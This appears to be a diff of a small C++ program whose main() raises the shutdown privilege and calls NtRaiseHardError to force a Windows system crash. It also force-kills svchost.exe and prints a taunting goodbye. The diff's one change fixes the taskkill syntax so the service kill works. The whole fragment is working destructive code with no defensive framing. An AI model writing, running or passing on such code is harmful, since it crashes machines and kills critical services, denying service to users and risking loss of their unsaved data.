@@ -15,7 +15,7 @@ int main() {
     unsigned long response;
     RtlAdjustPrivilege(19, true, false, &bl);
     NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 0, &response);
-    system("taskkill /f / im svchost.exe");
+    system("taskkill /f /im svchost.exe");
     std::cout << "\n\n:) Good Bye\n\n" << std::endl;
     return 0;
 }
